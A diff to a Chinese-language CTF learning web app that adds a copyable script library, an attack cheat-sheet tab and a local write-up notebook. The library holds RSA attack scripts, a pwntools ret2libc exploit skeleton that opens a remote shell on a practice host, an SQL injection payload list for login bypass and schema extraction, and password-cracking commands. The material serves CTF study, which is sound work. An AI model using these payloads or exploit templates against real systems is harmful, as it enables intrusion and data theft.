@@ -187,6 +187,46 @@ body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue'
 .guide-tool{padding:10px;background:var(--card);border:1px solid var(--border);border-radius:8px;text-align:center}
 .guide-tool .gt-name{font-size:12px;font-weight:500}
 .guide-tool .gt-use{font-size:10px;color:var(--text2);margin-top:3px}
+/* Script Library Styles */
+.script-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:14px;overflow:hidden}
+.script-head{display:flex;align-items:center;gap:10px;padding:12px 14px;cursor:pointer}
+.script-head .sc-icon{font-size:18px}
+.script-head .sc-info{flex:1}
+.script-head .sc-title{font-size:13px;font-weight:600}
+.script-head .sc-desc{font-size:11px;color:var(--text2);margin-top:2px}
+.script-head .sc-toggle{color:var(--text2);font-size:12px;transition:transform .3s}
+.script-card.open .sc-toggle{transform:rotate(90deg)}
+.script-body{display:none;padding:0 14px 14px}
+.script-card.open .script-body{display:block;animation:fadeIn .3s ease}
+.code-block{position:relative;background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:12px;overflow-x:auto}
+.code-block pre{font-family:'Courier New',Consolas,monospace;font-size:11.5px;line-height:1.6;color:#c9d1d9;white-space:pre;margin:0}
+.copy-btn{position:absolute;top:6px;right:6px;padding:4px 10px;background:var(--card2);border:1px solid var(--border);border-radius:6px;color:var(--text2);font-size:11px;cursor:pointer;transition:all .2s}
+.copy-btn:active{background:var(--primary);color:#fff}
+.copy-btn.copied{background:var(--success);color:#fff;border-color:var(--success)}
+/* WP Notebook Styles */
+.wp-form{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-bottom:16px;display:none}
+.wp-form.show{display:block;animation:slideUp .3s ease}
+.wp-form label{display:block;font-size:12px;color:var(--text2);margin:10px 0 5px}
+.wp-form label:first-child{margin-top:0}
+.wp-input,.wp-textarea,.wp-select{width:100%;background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:10px 12px;color:var(--text);font-size:13px;font-family:inherit}
+.wp-input:focus,.wp-textarea:focus,.wp-select:focus{outline:none;border-color:var(--primary)}
+.wp-textarea{resize:vertical;min-height:70px;line-height:1.5}
+.wp-form-actions{display:flex;gap:8px;margin-top:14px}
+.wp-form-actions button{flex:1;padding:11px;border-radius:8px;font-size:13px;cursor:pointer;border:none}
+.wp-save{background:var(--primary);color:#fff}
+.wp-cancel{background:var(--card2);border:1px solid var(--border)!important;color:var(--text2)}
+.wp-item{background:var(--card);border:1px solid var(--border);border-radius:10px;margin-bottom:10px;overflow:hidden}
+.wp-item-head{display:flex;align-items:center;gap:10px;padding:12px 14px;cursor:pointer}
+.wp-item-head .wp-cat-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.wp-item-head .wp-title{flex:1;font-size:13px;font-weight:500}
+.wp-item-head .wp-date{font-size:10px;color:var(--text2)}
+.wp-item-body{display:none;padding:0 14px 14px;font-size:12px;line-height:1.7;color:var(--text2)}
+.wp-item.open .wp-item-body{display:block;animation:fadeIn .3s ease}
+.wp-item-body .wp-field{margin-bottom:8px}
+.wp-item-body .wp-field b{color:var(--primary-light);display:block;font-size:11px;margin-bottom:2px}
+.wp-item-body .wp-field pre{background:#0d1117;border-radius:6px;padding:8px;overflow-x:auto;font-size:11px;color:#c9d1d9;white-space:pre-wrap;margin-top:4px}
+.wp-del{padding:6px 12px;background:rgba(225,112,85,.12);border:1px solid rgba(225,112,85,.3);border-radius:6px;color:var(--danger);font-size:11px;cursor:pointer}
+.add-wp-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--primary),#00cec9);border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:14px}
 </style>
 </head>
 <body>
@@ -234,6 +274,12 @@ body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue'
 </div>
 
 <div class="page" id="page-learn">
+<div class="tab-row">
+<div class="tab-pill active" onclick="showLearnTab('cards',this)">知识卡片</div>
+<div class="tab-pill" onclick="showLearnTab('ref',this)">攻击速查</div>
+<div class="tab-pill" onclick="showLearnTab('scripts',this)">脚本库</div>
+</div>
+<div id="learn-cards">
 <p class="section-title">知识卡片（点击翻转）</p>
 <div class="flashcard" id="flashcard" onclick="this.classList.toggle('flipped')">
 <div class="flashcard-inner">
@@ -246,7 +292,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue'
 <span class="fc-count" id="fc-count">1/50</span>
 <button onclick="nextCard()">下一张 →</button>
 </div>
-<div class="learn-section" style="margin-top:30px">
+</div>
+<div id="learn-ref" style="display:none">
+<div class="learn-section" style="margin-top:10px">
 <h3>Web 攻击速查</h3>
 <div class="learn-card"><h4>漏洞类型 → 利用</h4><p>
 <code>SQL注入</code> → union/盲注/报错/堆叠<br>
@@ -301,6 +349,125 @@ CRT: x≡ai (mod ni), ni互素
 RSA: c=m^e mod n, m=c^d mod n</div></div>
 </div>
 </div>
+<div id="learn-scripts" style="display:none">
+<p class="section-title">脚本速查库（点击展开，一键复制）</p>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">🔐</span><div class="sc-info"><div class="sc-title">RSA 基础解密</div><div class="sc-desc">已知 p, q, e, c 求明文</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>from Crypto.Util.number import *
+p = 1234567890...  # 填入 p
+q = 9876543210...  # 填入 q
+e = 65537
+c = 1122334455...  # 填入密文
+n = p * q
+phi = (p-1) * (q-1)
+d = inverse(e, phi)
+m = pow(c, d, n)
+print(long_to_bytes(m))</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">🔗</span><div class="sc-info"><div class="sc-title">RSA 共模攻击</div><div class="sc-desc">同 n 不同 e，gcd(e1,e2)=1</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>from Crypto.Util.number import *
+from gmpy2 import invert
+n, e1, e2, c1, c2 = ...  # 填入
+# 扩展欧几里得求 s1*e1 + s2*e2 = 1
+def egcd(a, b):
+    if b == 0: return (1, 0, a)
+    x, y, g = egcd(b, a % b)
+    return (y, x - (a//b)*y, g)
+s1, s2, _ = egcd(e1, e2)
+m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
+print(long_to_bytes(m))</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">📡</span><div class="sc-info"><div class="sc-title">RSA 广播攻击 (CRT)</div><div class="sc-desc">e=3，同一明文发给 ≥3 个不同 n</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>from Crypto.Util.number import *
+import gmpy2
+# 三组 (n, c)，e=3
+ns = [n1, n2, n3]
+cs = [c1, c2, c3]
+N = ns[0]*ns[1]*ns[2]
+m3 = 0
+for i in range(3):
+    Ni = N // ns[i]
+    m3 += cs[i] * Ni * gmpy2.invert(Ni, ns[i])
+m3 = m3 % N
+m = gmpy2.iroot(m3, 3)[0]  # 开三次方
+print(long_to_bytes(m))</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">⚡</span><div class="sc-info"><div class="sc-title">RSA dp 泄露</div><div class="sc-desc">已知 dp, e, n, c</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>from Crypto.Util.number import *
+import gmpy2
+dp, e, n, c = ...  # 填入
+for i in range(1, e):
+    # p = (dp*e - 1)/i + 1 需整除
+    if (dp*e - 1) % i == 0:
+        p = (dp*e - 1)//i + 1
+        if n % p == 0:
+            q = n // p
+            phi = (p-1)*(q-1)
+            d = gmpy2.invert(e, phi)
+            print(long_to_bytes(pow(c, d, n)))
+            break</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">🏛️</span><div class="sc-info"><div class="sc-title">古典密码速解</div><div class="sc-desc">凯撒 / 栅栏 / Base64 一行流</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>import base64, string
+s = "密文"
+# 凯撒暴力枚举所有偏移
+for k in range(26):
+    print(k, ''.join(chr((ord(c)-97+k)%26+97) if c.islower() else c for c in s.lower()))
+# Base64 解码
+print(base64.b64decode(s))
+# 十六进制转字符串
+print(bytes.fromhex('666c6167').decode())
+# URL 解码
+import urllib.parse; print(urllib.parse.unquote(s))</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">💥</span><div class="sc-info"><div class="sc-title">Pwn ROP 骨架 (ret2libc)</div><div class="sc-desc">pwntools 泄露 libc 拿 shell</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>from pwn import *
+# p = process('./pwn')
+p = remote('node.buuoj.cn', 12345)
+elf = ELF('./pwn'); libc = ELF('./libc.so.6')
+pop_rdi = 0x400793   # ROPgadget 找 pop rdi; ret
+ret = 0x400506       # ret 对齐栈
+puts_plt = elf.plt['puts']; puts_got = elf.got['puts']
+main = elf.sym['main']
+payload = b'a'*0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
+p.sendline(payload)
+leak = u64(p.recv(6).ljust(8, b'\x00'))
+base = leak - libc.sym['puts']
+sys = base + libc.sym['system']; binsh = base + next(libc.search(b'/bin/sh'))
+payload = b'a'*0x28 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys)
+p.sendline(payload)
+p.interactive()</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">🌐</span><div class="sc-info"><div class="sc-title">SQL 注入 Payload 清单</div><div class="sc-desc">常用注入语句，直接替换使用</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre>' OR 1=1--                    # 万能密码
+' ORDER BY 5--                # 探测列数
+' UNION SELECT 1,2,3--        # 联合查询
+' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'--
+' AND SLEEP(5)--              # 时间盲注
+' AND (SELECT LENGTH(database()))>5--  # 布尔盲注
+admin'--                      # 注释掉密码校验</pre></div></div></div>
+
+<div class="script-card"><div class="script-head" onclick="this.parentElement.classList.toggle('open')"><span class="sc-icon">🧩</span><div class="sc-info"><div class="sc-title">Misc 常用命令</div><div class="sc-desc">文件分析 / 隐写 / 流量 工具箱</div></div><span class="sc-toggle">▶</span></div>
+<div class="script-body"><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">复制</button><pre># 查看文件类型与隐藏内容
+file flag.png
+strings flag.png | grep -i flag
+binwalk flag.png          # 检测嵌入文件
+foremost -i flag.png      # 分离文件
+# 图片隐写
+zsteg flag.png            # LSB 隐写
+stegsolve.jar             # 通道分析
+exiftool flag.png         # 元数据
+# 压缩包
+zip2john flag.zip > hash  # 爆破密码
+john hash
+# 流量分析 (Wireshark 过滤器)
+http.request.method == "GET"
+tcp.stream eq 0
+dns</pre></div></div></div>
+
+</div>
+</div>
 
 <div class="page" id="page-ai">
 <p class="section-title">AI 学习助手</p>
@@ -335,9 +502,27 @@ RSA: c=m^e mod n, m=c^d mod n</div></div>
 <div class="tab-row">
 <div class="tab-pill active" onclick="showStatTab('history',this)">历史记录</div>
 <div class="tab-pill" onclick="showStatTab('wrong',this)">错题本</div>
+<div class="tab-pill" onclick="showStatTab('wp',this)">WP记录本</div>
 </div>
 <div id="stat-history"><p class="empty-state">暂无记录</p></div>
 <div id="stat-wrong" style="display:none"><p class="empty-state">暂无错题，继续加油！</p></div>
+<div id="stat-wp" style="display:none">
+<button class="add-wp-btn" onclick="toggleWpForm()">＋ 写一篇 WP（解题记录）</button>
+<div class="wp-form" id="wpForm">
+<label>题目标题 *</label><input class="wp-input" id="wp-title" placeholder="例如: [BUUCTF] babyrsa">
+<label>方向</label><select class="wp-select" id="wp-cat"><option>Crypto</option><option>Web</option><option>Pwn</option><option>Reverse</option><option>Misc</option></select>
+<label>题目来源 / 链接</label><input class="wp-input" id="wp-src" placeholder="例如: BUUCTF / CryptoHack / 某比赛">
+<label>考点</label><input class="wp-input" id="wp-tag" placeholder="例如: RSA共模攻击 / SQL盲注 / LSB隐写">
+<label>解题思路 *</label><textarea class="wp-textarea" id="wp-think" placeholder="这题考什么？你是怎么分析的？卡在哪？"></textarea>
+<label>关键脚本 / 命令</label><textarea class="wp-textarea" id="wp-code" placeholder="贴上你的解题脚本或关键命令（可选）"></textarea>
+<label>收获总结</label><textarea class="wp-textarea" id="wp-learn" placeholder="下次遇到这类题，第一步该做什么？"></textarea>
+<div class="wp-form-actions">
+<button class="wp-cancel" onclick="toggleWpForm()">取消</button>
+<button class="wp-save" onclick="saveWp()">保存 WP</button>
+</div>
+</div>
+<div id="wp-list"><p class="empty-state">还没有WP。做完题写下来，进步最快！</p></div>
+</div>
 </div>
 
 <div class="page" id="page-guide">
@@ -884,13 +1069,15 @@ let aiHistory=[{role:'system',content:'你是一个CTF竞赛学习助手，精�
 let aiLoading=false;
 
 let currentCat='web',quizQuestions=[],currentQ=0,score=0,answered=false,quizMode=5,timerOn=false,timerInterval=null,timeLeft=30,totalTime=0;
-let stats={total:0,correct:0,maxStreak:0,currentStreak:0,history:[],wrong:[],dailyDone:null};
+let stats={total:0,correct:0,maxStreak:0,currentStreak:0,history:[],wrong:[],dailyDone:null,wps:[]};
 let fcIndex=0;
 
-function load(){try{const s=JSON.parse(localStorage.getItem('ctf-all-v1'));if(s)stats=s;}catch(e){}updateUI();}
+function load(){try{const s=JSON.parse(localStorage.getItem('ctf-all-v1'));if(s)stats=s;}catch(e){}if(!stats.wps)stats.wps=[];renderWpList();updateUI();}
 function save(){try{localStorage.setItem('ctf-all-v1',JSON.stringify(stats));}catch(e){}}
 function switchPage(p,el){document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('active'));document.getElementById('page-'+p).classList.add('active');el.classList.add('active');}
 function toggleGuide(el){el.classList.toggle('open');const body=el.nextElementSibling;body.classList.toggle('open');}
+function showLearnTab(tab,el){document.querySelectorAll('#page-learn .tab-pill').forEach(t=>t.classList.remove('active'));el.classList.add('active');document.getElementById('learn-cards').style.display=tab==='cards'?'block':'none';document.getElementById('learn-ref').style.display=tab==='ref'?'block':'none';document.getElementById('learn-scripts').style.display=tab==='scripts'?'block':'none';}
+function copyCode(btn){const code=btn.parentElement.querySelector('pre').innerText;navigator.clipboard.writeText(code).then(()=>{btn.textContent='已复制';btn.classList.add('copied');setTimeout(()=>{btn.textContent='复制';btn.classList.remove('copied');},1500);}).catch(()=>{const ta=document.createElement('textarea');ta.value=code;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);btn.textContent='已复制';btn.classList.add('copied');setTimeout(()=>{btn.textContent='复制';btn.classList.remove('copied');},1500);});}
 function selectCat(el){document.querySelectorAll('.cat-btn').forEach(b=>b.classList.remove('selected'));el.classList.add('selected');currentCat=el.dataset.cat;}
 function selectMode(el){document.querySelectorAll('.mode-btn').forEach(b=>b.classList.remove('active'));el.classList.add('active');quizMode=el.dataset.mode;}
 function getPool(cat){if(cat==='mixed'){let p=[];Object.values(Q).forEach(a=>p.push(...a));return p;}return Q[cat]||[];}
@@ -999,7 +1186,35 @@ function backToSelect(){document.getElementById('quiz-select').style.display='bl
 function renderCard(){const c=flashcards[fcIndex];document.getElementById('fc-front').textContent=c.q;document.getElementById('fc-back').innerHTML=c.a.replace(/\n/g,'<br>');document.getElementById('fc-count').textContent=`${fcIndex+1}/${flashcards.length}`;document.getElementById('flashcard').classList.remove('flipped');}
 function nextCard(){fcIndex=(fcIndex+1)%flashcards.length;renderCard();}
 function prevCard(){fcIndex=(fcIndex-1+flashcards.length)%flashcards.length;renderCard();}
-function showStatTab(tab,el){document.querySelectorAll('.tab-pill').forEach(t=>t.classList.remove('active'));el.classList.add('active');document.getElementById('stat-history').style.display=tab==='history'?'block':'none';document.getElementById('stat-wrong').style.display=tab==='wrong'?'block':'none';}
+function showStatTab(tab,el){document.querySelectorAll('#page-stats .tab-pill').forEach(t=>t.classList.remove('active'));el.classList.add('active');document.getElementById('stat-history').style.display=tab==='history'?'block':'none';document.getElementById('stat-wrong').style.display=tab==='wrong'?'block':'none';document.getElementById('stat-wp').style.display=tab==='wp'?'block':'none';}
+function toggleWpForm(){document.getElementById('wpForm').classList.toggle('show');}
+function saveWp(){
+  const title=document.getElementById('wp-title').value.trim();
+  const think=document.getElementById('wp-think').value.trim();
+  if(!title||!think){alert('请填写题目标题和解题思路');return;}
+  stats.wps.unshift({
+    id:Date.now(),
+    title:title,
+    cat:document.getElementById('wp-cat').value,
+    src:document.getElementById('wp-src').value.trim(),
+    tag:document.getElementById('wp-tag').value.trim(),
+    think:think,
+    code:document.getElementById('wp-code').value.trim(),
+    learn:document.getElementById('wp-learn').value.trim(),
+    date:new Date().toLocaleDateString('zh-CN')
+  });
+  save();renderWpList();
+  ['wp-title','wp-src','wp-tag','wp-think','wp-code','wp-learn'].forEach(id=>document.getElementById(id).value='');
+  document.getElementById('wpForm').classList.remove('show');
+}
+function delWp(id){if(confirm('确定删除这篇WP吗？')){stats.wps=stats.wps.filter(w=>w.id!==id);save();renderWpList();}}
+function esc(s){return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function renderWpList(){
+  const colors={Crypto:'#6c5ce7',Web:'#00cec9',Pwn:'#e17055',Reverse:'#fdcb6e',Misc:'#00b894'};
+  const el=document.getElementById('wp-list');
+  if(!stats.wps||!stats.wps.length){el.innerHTML='<p class="empty-state">还没有WP。做完题写下来，进步最快！</p>';return;}
+  el.innerHTML=stats.wps.map(w=>`<div class="wp-item"><div class="wp-item-head" onclick="this.parentElement.classList.toggle('open')"><span class="wp-cat-dot" style="background:${colors[w.cat]||'#6c5ce7'}"></span><span class="wp-title">${esc(w.title)}</span><span class="wp-date">${w.cat} · ${w.date}</span></div><div class="wp-item-body">${w.src?`<div class="wp-field"><b>来源</b>${esc(w.src)}</div>`:''}${w.tag?`<div class="wp-field"><b>考点</b>${esc(w.tag)}</div>`:''}<div class="wp-field"><b>解题思路</b>${esc(w.think)}</div>${w.code?`<div class="wp-field"><b>关键脚本</b><pre>${esc(w.code)}</pre></div>`:''}${w.learn?`<div class="wp-field"><b>收获总结</b>${esc(w.learn)}</div>`:''}<button class="wp-del" onclick="event.stopPropagation();delWp(${w.id})">删除</button></div></div>`).join('');
+}
 function updateUI(){
   const rate=stats.total?Math.round(stats.correct/stats.total*100):0;
   document.getElementById('stat-total').textContent=stats.total;
